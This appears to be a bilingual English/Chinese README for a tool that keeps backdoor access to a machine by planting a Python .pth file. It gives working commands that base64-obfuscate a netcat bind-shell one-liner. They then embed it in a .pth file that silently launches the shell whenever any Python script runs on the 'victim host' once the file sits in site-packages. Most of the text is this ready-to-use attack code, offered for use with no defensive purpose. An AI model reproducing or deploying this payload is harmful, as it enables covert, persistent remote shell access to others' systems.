# Python .pth permissions maintain backdoor basic tool

# python .pth 权限维持后门基础工具



## How to use 如何使用

​	&nbsp;Here I use base64 encoding to obfuscate the nc rebound shell command.

​	&nbsp;这里我采用的是 base64 编码将 nc 反弹 shell 的命令进行混淆，

> echo 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvvp 45555 > /tmp/f' | base64 -w0

​	&nbsp;The 45555 above is the service port that needs to be opened on the victim host. Through the above command, we can obtain a base64-encoded nc rebound shell command content.

​	&nbsp;上面的 45555 是受害者主机需要开启的服务端口，通过上面的命令我们可以获取到一段经过 base64 编码的 nc 反弹 shell 命令的内容。

![make_evil_pth](https://github.com/thedarknessdied/.pth_study/blob/main/screen_shot/make_evil_pth.png)

> echo 'import subprocess;subprocess.Popen("echo \"cm0gLWYgL3RtcC9mOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgL2Jpbi9zaCAtaSAyPiYxIHwgbmMgLWx2dnAgNDU1NTUgPiAvdG1wL2YK\"|base64 -d |bash", shell=True, start_new_session=True, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))' > 1.pth

​	&nbsp;"cm0gLWYgL3RtcC9mOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgL2Jpbi9zaCAtaSAyPiYxIHwgbmMgLWx2dnAgNDU1NTUgPiAvdG1wL2YK" is the base64-encoded content obtained above. Embed it in the command. Through the above command, a 1.pth file will be obtained in the directory where the shell is executed.	

​	&nbsp;"cm0gLWYgL3RtcC9mOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgL2Jpbi9zaCAtaSAyPiYxIHwgbmMgLWx2dnAgNDU1NTUgPiAvdG1wL2YK"是上面获取到的经过 base64 编码的内容，将他嵌入到命令中，通过上面的命令会在 shell 执行的目录下获取到一个 1.pth 文件。

![make_evil_pth](https://github.com/thedarknessdied/.pth_study/blob/main/screen_shot/mv_pth2python_site_package_path.png)

​	&nbsp;Move the 1.pth file generated above to the python package management folder, and then just execute the python script at will to trigger the corresponding command execution (here the open port is used to execute the shell)

​	&nbsp;将上面生成的1.pth文件移动到python的包管理文件夹下，然后只要随意执行python脚本，就能够触发相应的命令执行（这里实现的是开放端口用于执行shell）

![make_evil_pth](https://github.com/thedarknessdied/.pth_study/blob/main/screen_shot/get_shell.png)

​	&nbsp;You can also generate a simple evil.pth file by executing the above python script, move this file to the python package management folder and execute the python script at will

​	&nbsp;你也可以通过执行上面的 python 脚本，从而生成一个简单的evil.pth文件，将这个文件移动到python的包管理文件夹下随意执行python脚本即可

